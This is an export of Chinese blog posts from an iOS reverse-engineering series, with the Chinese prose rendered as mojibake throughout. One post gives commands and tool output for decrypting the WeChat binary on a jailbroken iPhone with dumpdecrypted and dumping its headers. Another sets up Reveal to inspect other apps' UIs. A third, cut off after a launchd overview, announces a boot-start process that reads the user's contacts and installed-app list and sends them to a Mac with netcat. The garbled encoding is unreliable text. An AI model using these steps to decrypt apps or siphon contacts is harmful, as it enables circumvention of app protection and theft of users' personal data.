iOSæ”»é˜²ï¼ˆä¸‰ï¼‰ï¼šé…ç½®ä½¿ç”¨Revealå·¥å…·é€†å‘åˆ«äººçš„App UIç•Œé¢ class-dumpä¸‹è½½å®‰è£…class-dump å…³äºŽçš„class-dumpè¯¦ç»†å®‰è£…æ–¹æ³•ï¼Œè¯·ç‚¹å‡»è¿™é‡Œ class-dump å¯ç”¨äºŽ æŸ¥çœ‹é—­æºçš„åº”ç”¨ã€frameworksã€bundlesã€‚ å¯¹æ¯”ä¸€ä¸ª APP ä¸åŒç‰ˆæœ¬ä¹‹é—´çš„æŽ¥å£å˜åŒ–ã€‚ å¯¹ä¸€äº›ç§æœ‰ frameworks åšäº›æœ‰è¶£çš„è¯•éªŒã€‚ class-dumpçš„ç®€å•ä½¿ç”¨dumpå‡ºMacç‰ˆå¾®ä¿¡çš„å¤´æ–‡ä»¶1class-dump -H /Applications/WeChat.app -o ~/Desktop/dump/WeChat-dump -H è¦è§£æžçš„æ–‡ä»¶ /Applications/WeChat.app éœ€è¦åç¼–è¯‘çš„åº”ç”¨è·¯å¾„ -o è¾“å‡ºç›®å½•ï¼ˆåŽé¢è·Ÿè·¯å¾„ï¼‰ ~/Desktop/dump/WeChat-dump å¤´æ–‡ä»¶å­˜æ”¾è·¯å¾„ ä¹Ÿå¯ä»¥dumpå‡ºç³»ç»Ÿåº“12class-dump /System/Library/Frameworks/AppKit.framework // AppKitclass-dump /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk/System/Library/Frameworks/UIKit.framework // UIKit dumpMacç‰ˆå¾®ä¿¡ç»“æžœ æ‰§è¡Œå®ŒæˆåŽå³å¯åœ¨æŒ‡å®šè¾“å‡ºç›®å½•æŸ¥çœ‹dumpçš„å¤´æ–‡ä»¶ä¿¡æ¯ æ‰“å¼€æŸ¥çœ‹æŸä¸ªå¤´æ–‡ä»¶çš„å†…å®¹ dumpdecrypted æˆ‘ä»¬éƒ½çŸ¥é“Clutchæ˜¯ä¸€ä¸ªéžå¸¸åŽ‰å®³çš„ç ¸å£³å·¥å…·, é‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜éœ€è¦dumpdecryptedè¿™ä¸ªå·¥å…·å‘¢? å› ä¸ºClutchå¹¶ä¸æ˜¯ä¸‡èƒ½çš„,æ— æ³•ç ¸å¼€å«æœ‰å…¼å®¹WatchOs2çš„App, ä»ŽAppStoreä¸‹è½½çš„æœ‰äº›App(æ¯”å¦‚WeChat)å¹¶ä¸èƒ½ä½¿ç”¨Clutchæ¥è¿›è¡Œç ¸å£³, ä½¿ç”¨Clutchå·¥å…·æ¥è¿›è¡Œç ¸å£³ä¼šå¤±è´¥ã€‚ æˆ‘çš„å‡†å¤‡ MacOS 10.13.5 iPhone 5C 10.3.2 dumpdecrypted class-dump åœ¨Cydiaä¸­å®‰è£… cycript, å¯ä»¥å…ˆä¸ç”¨ç®¡ cycript æ˜¯ä»€ä¹ˆ, åŽç»­ä¼šå•ç‹¬è¯¦è®². iToolsæˆ–è€…å…¶ä»–åŠ©æ‰‹å·¥å…· ä¸‹è½½å®‰è£…dumpdecrypted åŽ» Github ä¸‹è½½dumpdecryptedæºç , æºç å°±ä¸€ä¸ªCæºæ–‡ä»¶. ä¸‹è½½åŽè§£åŽ‹ï¼Œæ–‡ä»¶å¦‚ä¸‹ï¼š dumpdecryptedpç¼–è¯‘ ä¸‹è½½åŽæ‰“å¼€Makefileæ–‡ä»¶ï¼Œæ³¨æ„ç¬¬ä¸‰è¡Œï¼š 1SDK=`xcrun --sdk iphoneos --show-sdk-path` è¿™é‡Œå¡«å†™çš„SDKå¿…é¡»ä¸Žä½ è¶Šç‹±çš„iPhoneç³»ç»Ÿç‰ˆæœ¬éœ€è¦ä¸€è‡´ï¼Œä½ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤å…ˆæŸ¥çœ‹ä½ Xcodeçš„SDKç‰ˆæœ¬ï¼š 1/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk è™½ç„¶æˆ‘çš„Xcodeçš„SDKç‰ˆæœ¬æ˜¯11.4ï¼Œä½†æ˜¯æˆ‘æŸ¥çœ‹äº†ä¸‹æ”¯æŒçš„ç›®å½•æ–‡ä»¶ï¼Œæ˜¯æœ‰10.3çš„æ”¯æŒæ–‡ä»¶çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æŽ¥ç¼–è¯‘ï¼ŒæŸ¥çœ‹ç›®å½•å¦‚ä¸‹ï¼š 12// è¿›å…¥Applicationå†…ï¼ŒXcodeå³é”®æ˜¾ç¤ºåŒ…å†…å®¹/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport æ‰“å¼€ç»ˆç«¯ï¼Œè¿›å…¥ä¸‹è½½çš„dumpdecryptedpæ–‡ä»¶å¤¹ç›®å½•, æ‰§è¡Œmakeå³å¯å®Œæˆç¼–è¯‘, æ“ä½œæ­¥éª¤å¦‚å›¾æ‰€ç¤º: 12345678910cd ~/Desktop/dumpdecryptedmake// ç¼–è¯‘å®Œè¾“å‡ºä¿¡æ¯å¦‚ä¸‹`xcrun --sdk iphoneos --find gcc` -Os -Wimplicit -isysroot `xcrun --sdk iphoneos --show-sdk-path` -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/Frameworks -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/PrivateFrameworks -arch armv7 -arch armv7s -arch arm64 -c -o dumpdecrypted.o dumpdecrypted.c`xcrun --sdk iphoneos --find gcc` -Os -Wimplicit -isysroot `xcrun --sdk iphoneos --show-sdk-path` -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/Frameworks -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/PrivateFrameworks -arch armv7 -arch armv7s -arch arm64 -dynamiclib -o dumpdecrypted.dylib dumpdecrypted.old: warning: directory not found for option '-F/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk/System/Library/PrivateFrameworks'ld: warning: directory not found for option '-F/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk/System/Library/PrivateFrameworks'ld: warning: directory not found for option '-F/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk/System/Library/PrivateFrameworks' ç¼–è¯‘æˆåŠŸåŽä¼šåœ¨dumpdecryptedpæ–‡ä»¶ç›®å½•ä¸‹ä¼šç”Ÿæˆdumpdecrypted.dylibå’Œdumpdecrypted.oä¸¤ä¸ªæ–‡ä»¶ã€‚ dumpecrypted.dylib ç­¾å å¦‚æžœä¸å¯¹è¯¥æ–‡ä»¶è¿›è¡Œç­¾å, åŽç»­ç ¸å£³çš„æ“ä½œä¼šå¤±è´¥. å…ˆæ‰¾åˆ°å·²ç»åœ¨ç”µè„‘ä¸Šé¢å®‰è£…çš„è‹¹æžœå¼€å‘è€…è¯ä¹¦, æ“ä½œå¦‚ä¸‹: 12## åˆ—å‡ºå¯ç­¾åè¯ä¹¦, æ‰¾åˆ° mac ä¸Šé¢å·²ç»å®‰è£…çš„è¯ä¹¦security find-identity -v -p codesigning dumpecrypted.dylibç­¾å, å‘½ä»¤å¦‚ä¸‹: 1codesign --force --verify --verbose --sign "iPhone Developer: xxx xxxx (xxxxxxxxxx)" dumpdecrypted.dylib &quot;iPhone Developer: xxx xxxx (xxxxxxxxxx)&quot; ä¸ºä¸Šä¸€æ­¥æ‰¾åˆ°çš„ä½ å·²ç»å®‰è£…çš„å¼€å‘è€…è¯ä¹¦åç§°ã€‚ dumpdecryptedpçš„ç®€å•ä½¿ç”¨æŸ¥æ‰¾ç›®æ ‡ App æ‰€åœ¨è¿›ç¨‹ æŽ¨èå…ˆæ¸…ç©ºæ‰‹æœºåŽå°è¿è¡Œçš„æ‰€æœ‰ç¨‹åº æ‰“å¼€å¾®ä¿¡åº”ç”¨ é€šè¿‡ç”µè„‘ç»ˆç«¯sshç™»å½•iPhoneæ‰‹æœºï¼ŒæŸ¥çœ‹å½“å‰è¿è¡Œçš„æ‰€æœ‰çš„è¿›ç¨‹ 1ps -e ä¼šåˆ—å‡ºæ‰€æœ‰å½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œè™½ç„¶æˆ‘ä»¬æ€æŽ‰äº†æ‰€æœ‰åŽå°æœåŠ¡ï¼Œä½†æ˜¯ä¼šæœ‰å¾ˆå¤šçš„ç³»ç»Ÿè¿›ç¨‹ä¿¡æ¯å¹²æ‰°ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä»¥WeChatç»“å°¾çš„è¿›ç¨‹ï¼Œå³æ˜¯æˆ‘ä»¬éœ€è¦çš„å¾®ä¿¡è¿›ç¨‹ PID æ˜¯å¾®ä¿¡è¿›ç¨‹çš„è¿›ç¨‹ID CMD æ˜¯å¾®ä¿¡è¿›ç¨‹å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ WeChat.app å³æ˜¯æˆ‘ä»¬éœ€è¦ç ¸å£³çš„ç›®æ ‡app 12PID TTY TIME CMD771 ?? 0:06.94 /var/containers/Bundle/Application/6EE23DA1-6DE3-4477-A099-1E34639EB9C1/WeChat.app/WeChat è¡¥å…… æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„æ¯”è¾ƒå¿«çš„æ–¹æ³•ï¼ˆå¦‚æžœçŸ¥é“å¯æ‰§è¡Œæ–‡ä»¶åç§°ï¼‰ 1find / -name WeChat.app æŸ¥æ‰¾ç¨‹åºè¿›ç¨‹PIDæ¯”è¾ƒå¿«çš„æ–¹æ³•ï¼ˆå¦‚æžœçŸ¥é“å¯æ‰§è¡Œæ–‡ä»¶åç§°ï¼‰ 1ps aux | grep WeChat æŸ¥æ‰¾ç›®æ ‡appçš„Documentsç›®å½• ç ¸å£³éœ€è¦å°†æˆ‘ä»¬ç¼–è¯‘ç”Ÿæˆçš„dumpdecrypted.dylibæ–‡ä»¶æ”¾å…¥ç›®æ ‡appçš„Documentsç›®å½•ä¸‹ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç›®æ ‡appçš„Documentsç›®å½•ã€‚ ç»ˆç«¯è¿›å…¥æ‰‹æœºçš„æ ¹ç›®å½•æ‰§è¡Œä¸‹é¢æŒ‡ä»¤, æˆ‘ä»¬ä¼šè¿›å…¥cy#æ¨¡å¼ï¼š 771 æ˜¯æˆ‘ä»¬ä¸Šä¸€æ­¥æŸ¥æ‰¾åˆ°çš„å¾®ä¿¡çš„è¿›ç¨‹ID 1CoderBoy-iPhone:~ root# cycript -p 771 åœ¨cy#æ¨¡å¼ä½¿ç”¨OCæ–¹æ³•æŸ¥æ‰¾å¾®ä¿¡åº”ç”¨çš„Documentsç›®å½•, è¾“å…¥ä¸‹é¢ä»£ç  1[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0] æˆåŠŸåŽä¼šè¾“å‡ºå¾®ä¿¡åº”ç”¨çš„Documentsç›®å½•è·¯å¾„ï¼Œå¦‚ä¸‹ï¼š æ³¨æ„: æ‰§è¡Œè¿‡ç¨‹ä¸­, åœ¨iPhoneä¸Šé¢æ‰“å¼€è¿è¡Œä¸€ä¸‹å¾®ä¿¡, ä¸ç„¶ä¸Šé¢çš„æ‰§è¡Œä¸€ç›´å¡åœ¨é‚£é‡Œä¸åŠ¨. æˆåŠŸåŽè¾“å…¥ctrlï¼‹dé€€å‡ºcycript 1#&quot;file:///var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/&quot; ç ¸å£³ æ‹·è´dumpdecrypted.dylibè¿™ä¸ªä¹‹å‰ç¼–è¯‘ç­¾åå¥½çš„æ–‡ä»¶åˆ°iPhoneä¸Šé¢è¯¥ç›®æ ‡APPçš„Documentsç›®å½•. æ–¹æ³•ä¸€ï¼šç›´æŽ¥åœ¨ç”µè„‘ä¸Šé€šè¿‡åŠ©æ‰‹è½¯ä»¶å°†dumpdecrypted.dylibæ”¾å…¥åˆ°ç›®æ ‡appçš„Documentsç›®å½•ã€‚ æ–¹æ³•äºŒï¼šä¹Ÿå¯ä»¥ä½¿ç”¨æŒ‡ä»¤å°†dumpdecrypted.dylibæ”¾å…¥åˆ°ç›®æ ‡appçš„Documentsç›®å½•ï¼Œæ“ä½œå¦‚ä¸‹ï¼š åœ¨Macä¸Šæ–°å»ºä¸€ä¸ªç»ˆç«¯ï¼Œå¦‚æžœå½“å‰æ˜¯åœ¨æ‰‹æœºrootæ¨¡å¼ï¼Œä¹Ÿå¯ä»¥è¾“å…¥exitç›´æŽ¥é€€å‡ºï¼Œè¾“å…¥å¦‚ä¸‹æŒ‡ä»¤ï¼š 1234// ~/Desktop/dumpdecrypted/dumpdecrypted.dylib ç¼–è¯‘ç­¾åå¥½çš„dumpdecrypted.dylibæ–‡ä»¶è·¯å¾„// /var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/ ä¸Šä¸€æ­¥èŽ·å–åˆ°çš„ç›®æ ‡appçš„Documentsç›®å½•scp ~/Desktop/dumpdecrypted/dumpdecrypted.dylib root@192.168.1.60:/var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/ è¿›å…¥åˆ°æ‰‹æœºDocumentsç›®å½•, æŸ¥çœ‹dumpdecrypted.dylibæ–‡ä»¶æ˜¯å¦å­˜åœ¨ 12345ssh root@192.168.1.60cd /var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documentsls -l å¼€å§‹ç ¸å£³ï¼Œæ³¨æ„ DYLD_INSERT_LIBRARIES=åŽå¡«å†™çš„æ˜¯ä½ åˆšåˆšä¼ è¾“åˆ°Documentsç›®å½•çš„.dylibæ–‡ä»¶åï¼Œæˆ‘çš„æ˜¯ dumpdecrypted.dylibã€‚ dumpdecrypted.dylibåŽçš„è·¯å¾„æ˜¯éœ€è¦ç ¸å£³çš„ç›®æ ‡appçš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œä¹Ÿå³æ˜¯ä¹‹å‰æŸ¥æ‰¾ç›®æ ‡appè¿›ç¨‹æ—¶èŽ·å–åˆ°çš„è·¯å¾„ï¼Œè€Œä¸æ˜¯Documentsç›®å½•è·¯å¾„ã€‚ 1YLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/containers/Bundle/Application/6EE23DA1-6DE3-4477-A099-1E34639EB9C1/WeChat.app/WeChat ç ¸å£³æˆåŠŸåŽè¾“å…¥ä¿¡æ¯å¦‚ä¸‹ï¼š ç ¸å£³æˆåŠŸåŽä¼šåœ¨Documentsç›®å½•ç”Ÿæˆä¸€ä¸ªåä¸ºAppName.decryptedæ–‡ä»¶,å¦‚å½“å‰æ“ä½œä¼šç”Ÿæˆä¸€ä¸ªWeChat.decryptedæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ls -læŒ‡ä»¤æŸ¥çœ‹ã€‚ 123456789101112131415161718mach-o decryption dumperDISCLAIMER: This tool is only meant for security research purposes, not for application crackers.[+] detected 32bit ARM binary in memory.[+] offset to cryptid found: @0x59a4c(from 0x59000) = a4c[+] Found encrypted data at address 00004000 of length 54755328 bytes - type 1.[+] Opening /private/var/containers/Bundle/Application/6EE23DA1-6DE3-4477-A099-1E34639EB9C1/WeChat.app/WeChat for reading.[+] Reading header[+] Detecting header type[+] Executable is a plain MACH-O image[+] Opening WeChat.decrypted for writing.[+] Copying the not encrypted start of the file[+] Dumping the decrypted data into the file[+] Copying the not encrypted remainder of the file[+] Setting the LC_ENCRYPTION_INFO-&gt;cryptid to 0 at offset a4c[+] Closing original file[+] Closing dump file ä½¿ç”¨Macçš„åŠ©æ‰‹å·¥å…·ç›´æŽ¥å°†ç”Ÿæˆçš„WeChat.decryptedæ–‡ä»¶æ‹·è´åˆ°æ¡Œé¢å³å¯ï¼Œä¹Ÿå¯ä½¿ç”¨ç»ˆç«¯æŒ‡ä»¤æ‹·è´ï¼Œå¦‚ä¸‹ é€€å‡ºæ‰‹æœºRootæ¨¡å¼ï¼Œæ‹·è´ç ¸å£³åŽæ–‡ä»¶åˆ°ç”µè„‘æ¡Œé¢ 123exitscp root@192.168.1.60:/var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/WeChat.decrypted ~/Desktop/WeChat.decrypted class dump ç ¸å£³åŽçš„æ–‡ä»¶ ç ¸å£³åŽçš„WeChat.decryptedæ–‡ä»¶å°±å¯ä»¥ä½¿ç”¨class-dumpå¯¼å‡ºå¤´æ–‡ä»¶ï¼Œå¦‚ä¸‹ --arch armv7æ˜¯æŒ‡å®šæž¶æž„ï¼Œdumpdecryptedåªä¼šç ¸ä½ æ‰‹æœºå¤„ç†å™¨å¯¹åº”çš„é‚£ä¸ªå£³ï¼Œfat binaryçš„å…¶å®ƒéƒ¨åˆ†ä»ç„¶æ˜¯æœ‰å£³çš„ è€Œclass-dumpçš„é»˜è®¤ç›®æ ‡åˆä¸æ˜¯è¢«ç ¸å£³çš„é‚£ä¸ªéƒ¨åˆ†ï¼Œå¦‚æžœä¸æŒ‡å®šæž¶æž„åªèƒ½å¯¼å‡ºCDStructures.hä¸€ä¸ªæ–‡ä»¶ 1class-dump --arch armv7 WeChat.decrypted -H -o /Users/sevencho/Desktop/dump/Wechat-decrypted-dump çŽ°åœ¨å°±å¯ä»¥çœ‹åˆ°åˆ«äººæ•´ä¸ªAPPçš„.hæ–‡ä»¶ä¿¡æ¯äº†ï¼Œé™¤äº†å¯ä»¥ä¼˜é›…çš„å­¦ä¹ å¤§åŽ‚Appçš„æŽ¥å£å‘½ååŠè®¾è®¡è§„èŒƒå¤–ï¼Œå½“ç„¶è¿˜å¯ä»¥ä¾é å¼ºå¤§çš„è¿è¡Œæ—¶ç‰¹æ€§åšä¸€äº›å…¶ä»–æœ‰æ„æ€çš„äº‹æƒ…ã€‚]]></content>
      <categories>
        <category>iOS</category>
        <category>æ”»é˜²</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>æ”»é˜²</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSæ”»é˜²ï¼ˆä¸‰ï¼‰ï¼šé…ç½®ä½¿ç”¨Revealå·¥å…·é€†å‘åˆ«äººçš„App UIç•Œé¢]]></title>
    <url>%2Farchives%2F4de69069.html</url>
    <content type="text"><![CDATA[ä½ ç”Ÿäº†æ°”å°±å“­,æˆ‘ä¸€çœ‹è§ä½ å“­å°±ç›®çžªå£å‘†,å°±åƒä¸€ä¸ªå°å­©å­åšäº†åäº‹åœ¨æœªå—è´£å¤‡ä¹‹å‰ç›®çžªå£å‘†ä¸€æ ·,æ‰€ä»¥ä»€ä¹ˆäº‹ä½ å…ˆåˆ«å“­,å…ˆæ¥è´£å¤‡æˆ‘,å¥½å—? â€”â€”çŽ‹å°æ³¢ã€Šçˆ±ä½ å°±åƒçˆ±ç”Ÿå‘½ã€‹ ç®€ä»‹ å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ Revealåœ¨é€†å‘å·¥ç¨‹ä¸­ä¸ä»…ä»…å¯ä»¥ç”¨æ¥æŸ¥çœ‹åˆ†æžåˆ«äººAppçš„UIå±‚æ¬¡ç»“æž„ï¼Œè¿˜å¯ä»¥ç”¨æ¥å¸®åŠ©æˆ‘ä»¬åœ¨å¹³æ—¶å¼€å‘ä¸­å¿«é€Ÿå®šä½é—®é¢˜ã€‚ å¯¹äºŽåˆå­¦è€…æ¥è¯´ï¼ŒåŽ»åˆ†æžå…¶ä»–ä¼˜ç§€Appçš„ç•Œé¢å®žçŽ°ï¼Œèƒ½å¤Ÿå¸®åŠ©å¿«é€Ÿæå‡å¼€å‘èƒ½åŠ›ã€‚ æˆ‘çš„çŽ¯å¢ƒé…ç½®ï¼š è¶Šç‹±iPhone5c 10.3.2 Mac 10.13.5 å¹¶ä¸”å®‰è£…æœ‰Reveal version 4(8796) æ‰€æœ‰èµ„æ–™æ–‡ä»¶&amp;å·¥å…·åœ¨è¿™é‡Œ äº†è§£æ›´å¤šï¼š iOSæ”»é˜²ï¼ˆä¸€ï¼‰ï¼š iPhoneæ‰‹æœºè¶Šç‹± &amp; SSH iOSæ”»é˜²ï¼ˆäºŒï¼‰ï¼šçªƒå–ç”¨æˆ·çš„é€šè®¯å½•ä¿¡æ¯ &amp; å·çª¥ç”¨æˆ·å®‰è£…åº”ç”¨åˆ—è¡¨ &amp; Netcatä½¿ç”¨ åœ¨è¶Šç‹±è®¾å¤‡ä¸Šé…ç½®RevealReveal Loaderå®‰è£… é¦–å…ˆåœ¨è¶Šç‹±è®¾å¤‡çš„Cydiaä¸­è¾“å…¥æœç´¢Reveal2Loaderï¼Œå¹¶ä¸”è¿›è¡Œå®‰è£…å³å¯ã€‚è¿™ä¸€æ­¥æ¯”è¾ƒç®€å•ï¼Œå®‰è£…åŽé‡å¯SpringBoardå³å¯ã€‚ æ³¨æ„å®‰è£…æœ€æ–°çš„Reveal2Loaderï¼Œå…¼å®¹iOS8/9/10,å¦‚æžœè¶Šç‹±è®¾å¤‡ç³»ç»Ÿç‰ˆæœ¬è¿‡ä½Žï¼Œè¯·ä¸‹è½½æ—§ç‰ˆæœ¬Reveal Loaderå®‰è£…å³å¯ã€‚ å¯¼å…¥libReveal.dylib å®‰è£…å®ŒæˆReveal2LoaderåŽæŸ¥çœ‹åœ¨/Library/è·¯å¾„ä¸‹ä¸‹æ˜¯å¦å­˜åœ¨RHRevealLoaderè¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”æŸ¥çœ‹è¯¥æ–‡ä»¶å¤¹ä¸­æ˜¯å¦æœ‰libReveal.dylibè¿™ä¸ªæ–‡ä»¶ã€‚ å¯ä»¥ä½¿ç”¨ç”µè„‘ç«¯åŠ©æ‰‹å·¥å…·æŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥åœ¨ç»ˆç«¯æŸ¥çœ‹ 12345678// è¿žæŽ¥æ‰‹æœºssh root@192.168.1.60 // è¿›å…¥Libraryæ–‡ä»¶å¤¹cd /Library // æŸ¥çœ‹Libraryæ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶åˆ—è¡¨ls -r æ–‡ä»¶å¤¹å­˜åœ¨ å¦‚æžœå­˜åœ¨libReveal.dylibè¿™ä¸ªæ–‡ä»¶ï¼Œåˆ™å®‰è£…Revealå®Œæˆã€‚ æ–‡ä»¶å¤¹ä¸å­˜åœ¨ å¦‚æžœä¸å­˜åœ¨libReveal.dylibè¿™ä¸ªæ–‡ä»¶ï¼ŒæŒ‰å¦‚ä¸‹æ­¥éª¤ æ‰‹åŠ¨åˆ›å»ºRHRevealLoaderè¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œå¯ä»¥ä½¿ç”¨iToolsæˆ–è€…Filzaï¼Œä¹Ÿå¯ä»¥é€šè¿‡æŒ‡ä»¤åˆ›å»º 1mkdir RHRevealLoader åœ¨Macç”µè„‘ä¸Šæ‰“å¼€Revealï¼Œæ‰“å¼€Revealèœå• -&gt; Help -&gt; Show Reveal Library in Finder -&gt; iOS Library æ³¨æ„ï¼šæ–°ç‰ˆæœ¬çš„Revealå·²ç»æ²¡æœ‰libReveal.dylibè¿™ä¸ªæ–‡ä»¶ï¼Œåªå­˜åœ¨ä¸€ä¸ªRevealServer.frameworkæ–‡ä»¶ã€‚ æˆ‘ä»¬éœ€è¦æ‰¾åˆ°è¿™ä¸ªåº“æ–‡ä»¶ä¸‹çš„RevealServerå¹¶å¤åˆ¶ä¸€ä»½åˆ°æ¡Œé¢ï¼Œé‡å‘½åä¸ºlibReveal.dylib å°†libReveal.dylibè¿™ä¸ªæ–‡ä»¶æ”¾å…¥æ‰‹æœºåˆšåˆ›å»ºçš„/Library/RHRevealLoader/è¿™ä¸ªæ–‡ä»¶å¤¹å†…ã€‚å¯ä»¥ä½¿ç”¨iToolsï¼Œä¹Ÿå¯ä»¥é€šè¿‡æŒ‡ä»¤ä¸Šä¼  1scp /Users/sevencho/Desktop/libReveal.dylib root@192.168.1.60:/Library/RHRevealLoader/libReveal.dylib è‡³æ­¤,æ‰‹æœºçš„Revealå®‰è£…é…ç½®å®Œæˆã€‚é‡å¯æ‰‹æœºå°±å¯ä»¥æ„‰å¿«çš„å’Œæ–°è®¤è¯†çš„åŸºå‹å°ä¼™ä¼´ä¸€èµ·çŽ©è€äº†ã€‚ Revealçš„ä½¿ç”¨åœ¨è®¾å¤‡ä¸Šé€‰æ‹©æƒ³è¦Revealçš„App åœ¨è¶Šç‹±è®¾å¤‡ä¸Šå®‰è£…å®ŒReveal LoaderåŽå°±å¯ä»¥åœ¨è®¾ç½®ä¸­æ‰¾åˆ°Revealçš„é…ç½®é¡¹ï¼Œåœ¨è¯¥é…ç½®é¡¹ä¸­æˆ‘ä»¬å¯ä»¥åŽ»é€‰æ‹©è¦Revealçš„Appã€‚ å¯¹äºŽè¶Šç‹±æ‰‹æœºï¼Œæ‰‹æœºä¸Šå®‰è£…çš„æ‰€æœ‰Appéƒ½å¯ä»¥Revealã€‚å½“ç„¶ä¹ŸåŒ…æ‹¬ä»ŽAppStoreä¸‹è½½çš„ï¼Œä¹ŸåŒ…æ‹¬iOSç³»ç»Ÿè‡ªå¸¦çš„ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š æŸ¥çœ‹Appçš„UIå±‚çº§ Macä¸ŠRevealæŸ¥çœ‹è®¾å¤‡ä¸ŠAppçš„UIå±‚çº§æ—¶å¯ä»¥é€šè¿‡USBè¿›è¡Œè¿žæŽ¥ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨wifiè¿žæŽ¥ï¼Œä½†è¦ä¿è¯ä½ çš„iOSè®¾å¤‡ä¸Žä½ çš„Macåœ¨åŒä¸€ä¸ªå±€åŸŸç½‘å†…ã€‚]]></content>
      <categories>
        <category>iOS</category>
        <category>æ”»é˜²</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>æ”»é˜²</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSæ”»é˜²ï¼ˆäºŒï¼‰ï¼šçªƒå–ç”¨æˆ·çš„é€šè®¯å½•ä¿¡æ¯ & å·çª¥ç”¨æˆ·å®‰è£…åº”ç”¨åˆ—è¡¨ & Netcatä½¿ç”¨]]></title>
    <url>%2Farchives%2Fbf5c1be0.html</url>
    <content type="text"><![CDATA[å’±ä»¬åº”å½“åœ¨ä¸€èµ·ï¼Œå¦åˆ™å°±å¤ªä¼¤å¤©å®³ç†å•¦ã€‚ â€”â€”çŽ‹å°æ³¢ã€Šçˆ±ä½ å°±åƒçˆ±ç”Ÿå‘½ã€‹ ç®€ä»‹ é€šè¿‡åœ¨iPhoneä¸Šå¼€å¯ä¸€ä¸ªå¼€æœºè‡ªå¯è¿›ç¨‹ï¼Œè¯»å–ç”¨æˆ·æ‰‹æœºé€šè®¯å½•æ•°æ®åº“æˆ–è€…ç”¨æˆ·åº”ç”¨å®‰è£…åˆ—è¡¨ï¼Œå†™åˆ°æ ‡å‡†è¾“å‡ºã€‚ å¼€å¯ä¸€ä¸ªSocketé€šä¿¡ç«¯å£ã€‚ é€šè¿‡ä½¿ç”¨NetCatå°†iPhoneæ‰‹æœºçš„æŒ‡å®šipç«¯å£æ•°æ®ä»¥æ–‡ä»¶æ ¼å¼ä¼ è¾“åˆ°Macæ¡Œé¢ä¸Šã€‚ æ‰€æœ‰èµ„æ–™æ–‡ä»¶&amp;å·¥å…·åœ¨è¿™é‡Œ äº†è§£æ›´å¤šï¼š iOSæ”»é˜²ï¼ˆä¸€ï¼‰ï¼š iPhoneæ‰‹æœºè¶Šç‹± &amp; SSH äº†è§£ä¸€ä¸‹OS Xçš„å¯åŠ¨åŽŸç† Macä¸‹çš„å¯åŠ¨æœåŠ¡ä¸»è¦æœ‰ä¸‰ä¸ªåœ°æ–¹å¯é…ç½®ï¼š ç³»ç»Ÿåå¥½è®¾ç½®-&gt;å¸æˆ·-&gt;ç™»é™†é¡¹ /System/Library/StartupItems å’Œ /Library/StartupItems/ launchd ç³»ç»Ÿåˆå§‹åŒ–è¿›ç¨‹é…ç½®ã€‚ launchdæ˜¯Mac OSä¸‹ï¼Œç”¨äºŽåˆå§‹åŒ–ç³»ç»ŸçŽ¯å¢ƒçš„å…³é”®è¿›ç¨‹ã€‚ç±»ä¼¼Linuxä¸‹çš„init, rcã€‚ å¯åŠ¨è¿‡ç¨‹ macå›ºä»¶æ¿€æ´»ï¼Œåˆå§‹åŒ–ç¡¬ä»¶ï¼ŒåŠ è½½BootXå¼•å¯¼å™¨ã€‚ BootXåŠ è½½å†…æ ¸ä¸Žå†…æ ¸æ‰©å±•(kext)ã€‚ å†…æ ¸å¯åŠ¨launchdè¿›ç¨‹ã€‚ launchdæ ¹æ® /System/Library/LaunchAgents /System/Library/LaunchDaemons /Library/LaunchDaemons Library/LaunchAgents ~/Library/LaunchAgentsé‡Œçš„plisté…ç½®ï¼Œå¯åŠ¨æœåŠ¡å®ˆæŠ¤è¿›ç¨‹ã€‚ 